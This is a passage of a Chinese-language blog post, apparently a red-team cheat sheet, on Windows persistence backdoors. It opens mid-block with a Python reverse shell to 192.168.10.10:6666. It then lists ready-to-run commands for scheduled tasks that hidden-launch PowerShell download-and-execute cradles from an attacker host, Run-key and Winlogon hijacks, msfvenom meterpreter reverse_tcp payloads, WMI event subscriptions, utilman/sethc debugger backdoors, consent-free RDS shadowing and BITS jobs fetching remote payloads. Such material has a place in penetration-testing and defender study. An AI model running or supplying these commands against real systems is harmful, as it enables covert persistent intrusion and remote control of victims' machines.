python.exe -c &quot;import socket,os,threading,subprocess as sp;p&#x3D;sp.Popen([&#39;cmd.exe&#39;],stdin&#x3D;sp.PIPE,stdout&#x3D;sp.PIPE,stderr&#x3D;sp.STDOUT);s&#x3D;socket.socket();s.connect((&#39;192.168.10.10&#39;,6666));threading.Thread(target&#x3D;exec,args&#x3D;(\&quot;while(True):o&#x3D;os.read(p.stdout.fileno(),1024);s.send(o)\&quot;,globals()),daemon&#x3D;True).start();threading.Thread(target&#x3D;exec,args&#x3D;(\&quot;while(True):i&#x3D;s.recv(1024);os.write(p.stdin.fileno(),i)\&quot;,globals())).start()&quot;</code></pre>

<h2 id="0x02-计划任务后门"><a href="#0x02-计划任务后门" class="headerlink" title="0x02 计划任务后门"></a>0x02 计划任务后门</h2><p>任务计划的父进程taskeng.exe</p>
<h3 id="1-schtasks命令"><a href="#1-schtasks命令" class="headerlink" title="1. schtasks命令"></a>1. schtasks命令</h3><pre class="language-none"><code class="language-none">1）原生方式
schtasks &#x2F;create &#x2F;sc minute &#x2F;mo 1 &#x2F;tn &quot;eviltask&quot; &#x2F;tr C:\tools\shell.cmd &#x2F;ru &quot;SYSTEM&quot;
schtasks &#x2F;create &#x2F;sc minute &#x2F;mo 1 &#x2F;tn &quot;eviltask&quot; &#x2F;tr calc &#x2F;ru &quot;SYSTEM&quot; &#x2F;s dc-mantvydas &#x2F;u user &#x2F;p password
schtasks &#x2F;Create &#x2F;RU &quot;NT AUTHORITY\SYSTEM&quot; &#x2F;tn [TaskName] &#x2F;tr &quot;regsvr32.exe -s \&quot;C:\Users\*\AppData\Local\Temp\[payload].dll\&quot;&quot; &#x2F;SC ONCE &#x2F;Z &#x2F;ST [Time] &#x2F;ET [Time]

2）用户Login
schtasks &#x2F;create &#x2F;tn OfficeUpdaterA &#x2F;tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http:&#x2F;&#x2F;192.168.10.10:8080&#x2F;schbackdoor&#39;&#39;&#39;))&#39;&quot; &#x2F;sc onlogon &#x2F;ru System
 
3）System启动
schtasks &#x2F;create &#x2F;tn OfficeUpdaterB &#x2F;tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http:&#x2F;&#x2F;192.168.10.10:8080&#x2F;schbackdoor&#39;&#39;&#39;))&#39;&quot; &#x2F;sc onstart &#x2F;ru System
 
4）User Idle (10mins)
schtasks &#x2F;create &#x2F;tn OfficeUpdaterC &#x2F;tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http:&#x2F;&#x2F;192.168.10.10:8080&#x2F;schbackdoor&#39;&#39;&#39;))&#39;&quot; &#x2F;sc onidle &#x2F;i 10</code></pre>

<h3 id="2-Powershell方式"><a href="#2-Powershell方式" class="headerlink" title="2. Powershell方式"></a>2. Powershell方式</h3><pre class="language-none"><code class="language-none">$A &#x3D; New-ScheduledTaskAction -Execute &quot;cmd.exe&quot; -Argument &quot;&#x2F;c C:\temp\backdoorell.exe&quot;
$T &#x3D; New-ScheduledTaskTrigger -Daily -At 1am

或者

$T &#x3D; New-ScheduledTaskTrigger -Daily -At &quot;11&#x2F;11&#x2F;2021 00:05:00 AM&quot;
$P &#x3D; New-ScheduledTaskPrincipal &quot;NT AUTHORITY\SYSTEM&quot; -RunLevel Highest
$S &#x3D; New-ScheduledTaskSettingsSet
$D &#x3D; New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
Register-ScheduledTask &quot;Backdoor&quot; -InputObject $D</code></pre>

<h2 id="0x03-HKLM-注册表后门"><a href="#0x03-HKLM-注册表后门" class="headerlink" title="0x03 HKLM 注册表后门"></a>0x03 HKLM 注册表后门</h2><p>在 HKLM\Software\Microsoft\Windows 的 Run 键中创建 REG_SZ 值</p>
<pre class="language-none"><code class="language-none">Value name:  Backdoor
Value data:  C:\Windows\Temp\backdoor.exe</code></pre>

<h3 id="1-基础方式"><a href="#1-基础方式" class="headerlink" title="1. 基础方式"></a>1. 基础方式</h3><pre class="language-none"><code class="language-none">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; &#x2F;v Evil &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\backdoor.exe&quot;

reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; &#x2F;v Evil &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\backdoor.exe&quot;

reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices&quot; &#x2F;v Evil &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\backdoor.exe&quot;

reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&quot; &#x2F;v Evil &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\backdoor.exe&quot;</code></pre>

<h3 id="2-Winlogon-Helper-DLL"><a href="#2-Winlogon-Helper-DLL" class="headerlink" title="2. Winlogon Helper DLL"></a>2. Winlogon Helper DLL</h3><pre class="language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.10.10 LPORT&#x3D;4444 -f exe &gt; evilbinary.exe
msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.10.10 LPORT&#x3D;4444 -f dll &gt; evilbinary.dll

---

reg add &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; &#x2F;v Userinit &#x2F;d &quot;Userinit.exe, evilbinary.exe&quot; &#x2F;f

reg add &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; &#x2F;v Shell &#x2F;d &quot;explorer.exe, evilbinary.exe&quot; &#x2F;f

Set-ItemProperty &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\&quot; &quot;Userinit&quot; &quot;Userinit.exe, evilbinary.exe&quot; -Force

Set-ItemProperty &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\&quot; &quot;Shell&quot; &quot;explorer.exe, evilbinary.exe&quot; -Force</code></pre>

<h3 id="3-GlobalFlag"><a href="#3-GlobalFlag" class="headerlink" title="3. GlobalFlag"></a>3. GlobalFlag</h3><pre class="language-none"><code class="language-none">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; &#x2F;v GlobalFlag &#x2F;t REG_DWORD &#x2F;d 512

reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; &#x2F;v ReportingMode &#x2F;t REG_DWORD &#x2F;d 1

reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; &#x2F;v MonitorProcess &#x2F;d &quot;C:\temp\evil.exe&quot;</code></pre>

<h2 id="0x04-自启动服务后门"><a href="#0x04-自启动服务后门" class="headerlink" title="0x04 自启动服务后门"></a>0x04 自启动服务后门</h2><h3 id="1-Powershell"><a href="#1-Powershell" class="headerlink" title="1. Powershell"></a>1. Powershell</h3><pre class="language-none"><code class="language-none">New-Service -Name &quot;Backdoor&quot; -BinaryPathName &quot;C:\Windows\Temp\backdoor.exe&quot; -Description &quot;Nothing to see here.&quot; -StartupType Automatic

sc start pentestlab</code></pre>

<h3 id="2-sc"><a href="#2-sc" class="headerlink" title="2. sc"></a>2. sc</h3><pre class="language-none"><code class="language-none">sc create Backdoor binpath&#x3D; &quot;cmd.exe &#x2F;k C:\temp\backdoor.exe&quot; start&#x3D;&quot;auto&quot; obj&#x3D;&quot;LocalSystem&quot;
sc start Backdoor</code></pre>

<h3 id="3-SharPersist"><a href="#3-SharPersist" class="headerlink" title="3. SharPersist"></a>3. SharPersist</h3><pre class="language-none"><code class="language-none">SharPersist -t service -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;&#x2F;c backdoor.exe&quot; -n &quot;Backdoor&quot; -m add</code></pre>

<h2 id="0x05-WMI事件订阅"><a href="#0x05-WMI事件订阅" class="headerlink" title="0x05 WMI事件订阅"></a>0x05 WMI事件订阅</h2><h3 id="1-CMD命令"><a href="#1-CMD命令" class="headerlink" title="1. CMD命令"></a>1. CMD命令</h3><pre class="language-none"><code class="language-none"># windwos启动后60s生成文件

wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name&#x3D;&quot;WMIPersist&quot;, EventNameSpace&#x3D;&quot;root\cimv2&quot;,QueryLanguage&#x3D;&quot;WQL&quot;, Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;

wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name&#x3D;&quot;WMIPersist&quot;, ExecutablePath&#x3D;&quot;C:\Windows\System32\binary.exe&quot;,CommandLineTemplate&#x3D;&quot;C:\Windows\System32\binary.exe&quot;

wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter&#x3D;&quot;__EventFilter.Name&#x3D;\&quot;WMIPersist\&quot;&quot;, Consumer&#x3D;&quot;CommandLineEventConsumer.Name&#x3D;\&quot;WMIPersist\&quot;&quot;

# 移除命令

Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name&#x3D;&#39;WMIPersist&#39;&quot; | Remove-WmiObject -Verbose</code></pre>

<h3 id="2-Powershell命令"><a href="#2-Powershell命令" class="headerlink" title="2. Powershell命令"></a>2. Powershell命令</h3><pre class="language-none"><code class="language-none"># 使用powershel部署

$FilterArgs &#x3D; @&#123;name&#x3D;&#39;WMIPersist&#39;; EventNameSpace&#x3D;&#39;root\CimV2&#39;; QueryLanguage&#x3D;&quot;WQL&quot;; Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &gt;&#x3D; 60 AND TargetInstance.SystemUpTime &lt; 90&quot;&#125;;
$Filter&#x3D;New-CimInstance -Namespace root&#x2F;subscription -ClassName __EventFilter -Property $FilterArgs
$ConsumerArgs &#x3D; @&#123;name&#x3D;&#39;WMIPersist&#39;; CommandLineTemplate&#x3D;&quot;$($Env:SystemRoot)\System32\binary.exe&quot;;&#125;
$Consumer&#x3D;New-CimInstance -Namespace root&#x2F;subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
$FilterToConsumerArgs &#x3D; @&#123;Filter &#x3D; [Ref] $Filter; Consumer &#x3D; [Ref] $Consumer;&#125;
$FilterToConsumerBinding &#x3D; New-CimInstance -Namespace root&#x2F;subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs

# powershell移除命令

$EventConsumerToCleanup &#x3D; Get-WmiObject -Namespace root&#x2F;subscription -Class CommandLineEventConsumer -Filter &quot;Name &#x3D; &#39;WMIPersist&#39;&quot;
$EventFilterToCleanup &#x3D; Get-WmiObject -Namespace root&#x2F;subscription -Class __EventFilter -Filter &quot;Name &#x3D; &#39;WMIPersist&#39;&quot;
$FilterConsumerBindingToCleanup &#x3D; Get-WmiObject -Namespace root&#x2F;subscription -Query &quot;REFERENCES OF &#123;$($EventConsumerToCleanup.__RELPATH)&#125; WHERE ResultClass &#x3D; __FilterToConsumerBinding&quot;
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject</code></pre>

<h2 id="0x06-RDP后门"><a href="#0x06-RDP后门" class="headerlink" title="0x06 RDP后门"></a>0x06 RDP后门</h2><h3 id="1-utilman-exe"><a href="#1-utilman-exe" class="headerlink" title="1. utilman.exe"></a>1. utilman.exe</h3><pre class="language-none"><code class="language-none"># 在登录屏幕，按 Windows 键+U，得到一个SYSTEM权限 cmd.exe 窗口

REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f</code></pre>

<h3 id="2-sethc-exe"><a href="#2-sethc-exe" class="headerlink" title="2. sethc.exe"></a>2. sethc.exe</h3><pre class="language-none"><code class="language-none"># 在 RDP 登录屏幕时多次按下 F5键

REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f</code></pre>

<h2 id="0x07-RDS-Shadowing后门"><a href="#0x07-RDS-Shadowing后门" class="headerlink" title="0x07 RDS Shadowing后门"></a>0x07 RDS Shadowing后门</h2><pre class="language-none"><code class="language-none"># 未经用户许可查看会话
reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot; &#x2F;v Shadow &#x2F;t REG_DWORD &#x2F;d 4

# 允许远程连接
reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f


# 禁用 UAC 远程限制
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f

# 使用mstsc建立影子连接
mstsc &#x2F;v:&#123;ADDRESS&#125; &#x2F;shadow:&#123;SESSION_ID&#125; &#x2F;noconsentprompt &#x2F;prompt

 &#x2F;v参数：允许指定&#123;ADDRESS&#125;可以是远程主机的 IP 地址或主机名的值；
 &#x2F;shadow参数：用于指定&#123;SESSION_ID&#125;作为 shadowee 会话 ID 的值
 &#x2F;noconsentprompt参数：允许绕过影子对象的权限
 &#x2F;prompt参数：用于指定用户连接到远程主机的凭据</code></pre>

<h2 id="0x08-BITS-Jobs"><a href="#0x08-BITS-Jobs" class="headerlink" title="0x08 BITS Jobs"></a>0x08 BITS Jobs</h2><p>BITS（后台智能传输服务）是一个 Windows 组件，它可以利用空闲的带宽在前台或后台异步传输文件，Bits Job提供了持久化任务的功能</p>
<pre class="language-none"><code class="language-none">bitsadmin &#x2F;create backdoor
bitsadmin &#x2F;addfile backdoor &quot;http:&#x2F;&#x2F;10.10.10.10&#x2F;evil.exe&quot;  &quot;C:\tmp\evil.exe&quot;

# v1
bitsadmin &#x2F;SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
bitsadmin &#x2F;SetMinRetryDelay &quot;backdoor&quot; 60
bitsadmin &#x2F;resume backdoor

# v2 - exploit&#x2F;multi&#x2F;script&#x2F;web_delivery
bitsadmin &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;10.10.10.10:8080&#x2F;backdoor.sct scrobj.dll&quot;
bitsadmin &#x2F;resume backdoor</code></pre>

<h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/persistence">https://www.ired.team/offensive-security/persistence</a></li>
<li><a target="_blank" rel="noopener" href="https://fuzzysecurity.com/tutorials/19.html">https://fuzzysecurity.com/tutorials/19.html</a></li>
<li><a target="_blank" rel="noopener" href="http://pwnwiki.io/#!persistence/windows/index.md">http://pwnwiki.io/#!persistence/windows/index.md</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/netbiosX/Checklists/blob/master/Persistence.md">https://github.com/netbiosX/Checklists/blob/master/Persistence.md</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mandiant/SharPersist">https://github.com/mandiant/SharPersist</a></li>
<li><a target="_blank" rel="noopener" href="https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/">https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/">https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-persistence-com-hijacking-mitre-t1546-015/">https://www.hackingarticles.in/windows-persistence-com-hijacking-mitre-t1546-015/</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Windows/" rel="tag" <i class="fa fa-tag"></i> Windows</a>
              <a href="/tags/Persistence/" rel="tag" <i class="fa fa-tag"></i> Persistence</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/22306/" rel="prev" title="开源HIDS之Wazuh探究">
                  <i class="fa fa-chevron-left"></i> 开源HIDS之Wazuh探究
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/80063/" rel="next" title="Windows 提权方式总结">
                  Windows 提权方式总结 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
</div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/third-party/pace.js"></script>

  





</body>
</html>
